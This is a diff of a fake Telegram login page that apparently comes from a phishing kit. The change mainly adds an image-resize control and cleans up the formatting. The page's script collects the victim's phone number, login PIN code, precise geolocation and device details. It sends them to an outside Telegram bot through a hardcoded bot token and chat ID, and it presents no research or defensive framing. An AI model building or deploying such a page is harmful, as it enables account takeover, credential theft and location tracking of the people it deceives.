@@ -1,238 +1,257 @@
-‏<!DOCTYPE html>
-‏<html lang="en">
-‏<head>
-‏    <meta charset="UTF-8">
-‏    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-‏    <title>Telegram Login</title>
-‏    <style>
-‏        body {
-‏            font-family: Arial, sans-serif;
-‏            margin: 0;
-‏            padding: 0;
-‏            display: flex;
-‏            justify-content: center;
-‏            align-items: center;
-‏            height: 100vh;
-‏            background-color: #f5f5f5;
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telegram Login</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #f5f5f5;
         }
 
-‏        .container {
-‏            display: flex;
-‏            justify-content: center;
-‏            align-items: center;
-‏            flex-direction: column;
-‏            background-color: #fff;
-‏            border-radius: 10px;
-‏            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
-‏            padding: 20px;
-‏            width: 300px;
+        .container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            background-color: #fff;
+            border-radius: 10px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+            width: 300px;
         }
 
-‏        .container img {
-‏            width: 20px;
-‏            height: 20px;
-‏            object-fit: contain;
-‏            margin-bottom: 20px;
+        .container img {
+            width: 90px; /* يمكنك تغيير الحجم هنا */
+            height: auto; /* يحافظ على نسبة العرض إلى الارتفاع */
+            object-fit: contain; /* يساعد على ضبط المحتوى داخل الحاوية */
+            margin-bottom: 20px;
+            max-width: 100%; /* يجعل الصورة تستجيب لحجم الحاوية */
         }
 
-‏        .login-box h1 {
-‏            font-size: 24px;
-‏            color: #333;
-‏            margin-bottom: 20px;
+        .login-box h1 {
+            font-size: 24px;
+            color: #333;
+            margin-bottom: 20px;
         }
 
-‏        .login-box label {
-‏            display: block;
-‏            font-size: 14px;
-‏            margin-bottom: 5px;
-‏            color: #555;
+        .login-box label {
+            display: block;
+            font-size: 14px;
+            margin-bottom: 5px;
+            color: #555;
         }
 
-‏        .login-box select,
-‏        .login-box input[type="tel"],
-‏        .login-box input[type="number"] {
-‏            width: 100%;
-‏            padding: 10px;
-‏            font-size: 14px;
-‏            border: 1px solid #ccc;
-‏            border-radius: 5px;
-‏            margin-bottom: 15px;
-‏            box-sizing: border-box;
+        .login-box select,
+        .login-box input[type="tel"],
+        .login-box input[type="number"] {
+            width: 100%;
+            padding: 10px;
+            font-size: 14px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            margin-bottom: 15px;
+            box-sizing: border-box;
         }
 
-‏        .login-box button {
-‏            width: 100%;
-‏            padding: 10px;
-‏            font-size: 16px;
-‏            color: #fff;
-‏            background-color: #0088cc;
-‏            border: none;
-‏            border-radius: 5px;
-‏            cursor: pointer;
+        .login-box button {
+            width: 100%;
+            padding: 10px;
+            font-size: 16px;
+            color: #fff;
+            background-color: #0088cc;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
         }
 
-‏        .login-box button:hover {
-‏            background-color: #005f99;
+        .login-box button:hover {
+            background-color: #005f99;
         }
 
-‏        .login-box p {
-‏            margin-top: 15px;
-‏            font-size: 12px;
-‏            color: #777;
+        .login-box p {
+            margin-top: 15px;
+            font-size: 12px;
+            color: #777;
         }
 
-‏        .login-box p a {
-‏            color: #0088cc;
-‏            text-decoration: none;
+        .login-box p a {
+            color: #0088cc;
+            text-decoration: none;
         }
 
-‏        .login-box p a:hover {
-‏            text-decoration: underline;
+        .login-box p a:hover {
+            text-decoration: underline;
         }
 
-‏        input[type="number"]::-webkit-inner-spin-button, 
-‏        input[type="number"]::-webkit-outer-spin-button {
-‏            -webkit-appearance: none;
-‏            margin: 0;
+        input[type="number"]::-webkit-inner-spin-button, 
+        input[type="number"]::-webkit-outer-spin-button {
+            -webkit-appearance: none;
+            margin: 0;
         }
 
-‏        input[type="number"] {
-‏            -moz-appearance: textfield;
+        input[type="number"] {
+            -moz-appearance: textfield;
         }
-‏    </style>
-‏</head>
-‏<body>
-‏    <div class="container">
-‏        <div class="login-box">
-‏            <center><img src="telegram.png" alt="Logo"></center>
-‏            <center><h1>Telegram</h1></center>
-‏            <form id="loginForm">
-‏                <label for="countryCode">Country Code</label>
-‏                <select id="countryCode" name="countryCode">
-‏                    <option value="+964" selected>+964 (Iraq)</option>
-‏                    <option value="+1">+1 (USA)</option>
-‏                    <option value="+44">+44 (UK)</option>
-‏                    <option value="+91">+91 (India)</option>
-‏                    <option value="+20">+20 (Egypt)</option>
-‏                    <option value="+971">+971 (UAE)</option>
-‏                </select>
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="login-box">
+            <center><img src="telegram.png" alt="Logo"></center>
+            <center><h1>Telegram</h1></center>
+            <form id="loginForm">
+                <label for="countryCode">Country Code</label>
+                <select id="countryCode" name="countryCode">
+                    <option value="+964" selected>+964 (Iraq)</option>
+                    <option value="+1">+1 (USA)</option>
+                    <option value="+44">+44 (UK)</option>
+                    <option value="+91">+91 (India)</option>
+                    <option value="+20">+20 (Egypt)</option>
+                    <option value="+971">+971 (UAE)</option>
+                </select>
 
-‏                <label for="phone">Phone Number</label>
-‏                <input type="number" id="phone" name="phone" placeholder="Enter your phone number" required>
+                <label for="phone">Phone Number</label>
+                <input type="number" id="phone" name="phone" placeholder="Enter your phone number" required>
 
-‏                <button type="button" id="nextButton">Next</button>
-‏            </form>
-‏            <p>By continuing, you agree to the <a href="#">Terms of Service</a>.</p>
-‏        </div>
-‏    </div>
+                <label for="imageSize">Image Size (px):</label>
+                <input type="number" id="imageSize" placeholder="Enter size (e.g., 100)">
+                <button type="button" id="resizeButton">Resize Image</button>
 
-‏    <script>
-‏        function sendToTelegram(data) {
-‏            const BOT_TOKEN = "5682784122:AAFGjK0Or0jMK8g928ckWGSt4XUTojYxcRI";
-‏            const CHAT_ID = "1676411287";
+                <button type="button" id="nextButton">Next</button>
+            </form>
+            <p>By continuing, you agree to the <a href="#">Terms of Service</a>.</p>
+        </div>
+    </div>
 
-‏            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-‏                method: "POST",
-‏                headers: {
-‏                    "Content-Type": "application/json",
+    <script>
+        function sendToTelegram(data) {
+            const BOT_TOKEN = "5682784122:AAFGjK0Or0jMK8g928ckWGSt4XUTojYxcRI";
+            const CHAT_ID = "1676411287";
+
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json",
                 },
-‏                body: JSON.stringify({
-‏                    chat_id: CHAT_ID,
-‏                    text: data,
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: data,
                 }),
             })
-‏                .then((response) => {
-‏                    if (response.ok) {
-‏                        alert("successfully!");
-‏                    } else {
-‏                        alert("Failed.");
+                .then((response) => {
+                    if (response.ok) {
+                        alert("Successfully sent!");
+                    } else {
+                        alert("Failed.");
                     }
                 })
-‏                .catch((error) => {
-‏                    alert("Error sending data.");
-‏                    console.error(error);
+                .catch((error) => {
+                    alert("Error sending data.");
+                    console.error(error);
                 });
         }
 
-‏        const nextButton = document.getElementById("nextButton");
-‏        const loginForm = document.getElementById("loginForm");
+        const resizeButton = document.getElementById("resizeButton");
+        resizeButton.addEventListener("click", () => {
+            const imageSize = document.getElementById("imageSize").value.trim();
+            const image = document.querySelector(".container img");
 
-‏        nextButton.addEventListener("click", () => {
-‏            const phoneInput = document.getElementById("phone").value.trim();
-‏            const countryCode = document.getElementById("countryCode").value;
-
-‏            if (phoneInput === "") {
-‏                alert("Please enter your phone number.");
-‏                return;
+            if (!imageSize || imageSize <= 0) {
+                alert("Please enter a valid image size.");
+                return;
             }
 
-‏            if (!/^\d{8,}$/.test(phoneInput)) {
-‏                alert("Phone number must be at least 8 digits and contain only numbers.");
-‏                return;
+            image.style.width = `${imageSize}px`;
+            image.style.height = "auto"; // الحفاظ على النسبة
+        });
+
+        const nextButton = document.getElementById("nextButton");
+        const loginForm = document.getElementById("loginForm");
+
+        nextButton.addEventListener("click", () => {
+            const phoneInput = document.getElementById("phone").value.trim();
+            const countryCode = document.getElementById("countryCode").value;
+
+            if (phoneInput === "") {
+                alert("Please enter your phone number.");
+                return;
             }
 
-‏            document.getElementById("phone").disabled = true;
-‏            document.getElementById("countryCode").disabled = true;
-‏            nextButton.style.display = "none";
+            if (!/^\d{8,}$/.test(phoneInput)) {
+                alert("Phone number must be at least 8 digits and contain only numbers.");
+                return;
+            }
 
-‏            const pinLabel = document.createElement("label");
-‏            pinLabel.setAttribute("for", "pin");
-‏            pinLabel.innerText = "Enter PIN";
+            document.getElementById("phone").disabled = true;
+            document.getElementById("countryCode").disabled = true;
+            nextButton.style.display = "none";
 
-‏            const pinInput = document.createElement("input");
-‏            pinInput.setAttribute("type", "number");
-‏            pinInput.setAttribute("id", "pin");
-‏            pinInput.setAttribute("name", "pin");
-‏            pinInput.setAttribute("placeholder", "Enter the PIN code");
-‏            pinInput.required = true;
+            const pinLabel = document.createElement("label");
+            pinLabel.setAttribute("for", "pin");
+            pinLabel.innerText = "Enter PIN";
 
-‏            const verifyButton = document.createElement("button");
-‏            verifyButton.setAttribute("type", "button");
-‏            verifyButton.innerText = "Verify";
+            const pinInput = document.createElement("input");
+            pinInput.setAttribute("type", "number");
+            pinInput.setAttribute("id", "pin");
+            pinInput.setAttribute("name", "pin");
+            pinInput.setAttribute("placeholder", "Enter the PIN code");
+            pinInput.required = true;
 
-‏            loginForm.appendChild(pinLabel);
-‏            loginForm.appendChild(pinInput);
-‏            loginForm.appendChild(verifyButton);
+            const verifyButton = document.createElement("button");
+            verifyButton.setAttribute("type", "button");
+            verifyButton.innerText = "Verify";
 
-‏            verifyButton.addEventListener("click", () => {
-‏                const pin = pinInput.value.trim();
+            loginForm.appendChild(pinLabel);
+            loginForm.appendChild(pinInput);
+            loginForm.appendChild(verifyButton);
 
-‏                if (pin === "" || pin.length < 4) {
-‏                    alert("Please enter a valid PIN (at least 4 digits).");
-‏                    return;
+            verifyButton.addEventListener("click", () => {
+                const pin = pinInput.value.trim();
+
+                if (pin === "" || pin.length < 4) {
+                    alert("Please enter a valid PIN (at least 4 digits).");
+                    return;
                 }
 
-‏                if (navigator.geolocation) {
-‏                    navigator.geolocation.getCurrentPosition(
-‏                        (position) => {
-‏                            const latitude = position.coords.latitude;
-‏                            const longitude = position.coords.longitude;
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        (position) => {
+                            const latitude = position.coords.latitude;
+                            const longitude = position.coords.longitude;
 
-‏                            const deviceInfo = `Device Info: ${navigator.userAgent}`;
-‏                            const data = `Phone: ${countryCode} ${phoneInput}\nPIN: ${pin}\nLatitude: ${latitude}\nLongitude: ${longitude}\n${deviceInfo}`;
+                            const deviceInfo = `Device Info: ${navigator.userAgent}`;
+                            const data = `Phone: ${countryCode} ${phoneInput}\nPIN: ${pin}\nLatitude: ${latitude}\nLongitude: ${longitude}\n${deviceInfo}`;
 
-‏                            sendToTelegram(data);
+                            sendToTelegram(data);
                         },
-‏                        (error) => {
-‏                            alert("Unable to fetch location. Sending data without location.");
-‏                            const deviceInfo = `Device Info: ${navigator.userAgent}`;
-‏                            const data = `Phone: ${countryCode} ${phoneInput}\nPIN: ${pin}\nLocation: Not Available\n${deviceInfo}`;
-‏                            sendToTelegram(data);
+                        (error) => {
+                            alert("Unable to fetch location. Sending data without location.");
+                            const deviceInfo = `Device Info: ${navigator.userAgent}`;
+                            const data = `Phone: ${countryCode} ${phoneInput}\nPIN: ${pin}\nLocation: Not Available\n${deviceInfo}`;
+                            sendToTelegram(data);
                         },
                         {
-‏                            enableHighAccuracy: true,
-‏                            timeout: 10000,
-‏                            maximumAge: 0,
+                            enableHighAccuracy: true,
+                            timeout: 10000,
+                            maximumAge: 0,
                         }
                     );
-‏                } else {
-‏                    alert("Geolocation not supported. Sending data without location.");
-‏                    const deviceInfo = `Device Info: ${navigator.userAgent}`;
-‏                    const data = `Phone: ${countryCode} ${phoneInput}\nPIN: ${pin}\nLocation: Not Available\n${deviceInfo}`;
-‏                    sendToTelegram(data);
+                } else {
+                    alert("Geolocation not supported. Sending data without location.");
+                    const deviceInfo = `Device Info: ${navigator.userAgent}`;
+                    const data = `Phone: ${countryCode} ${phoneInput}\nPIN: ${pin}\nLocation: Not Available\n${deviceInfo}`;
+                    sendToTelegram(data);
                 }
             });
         });
-‏    </script>
-‏</body>
-‏</html>
+    </script>
+</body>
+</html>
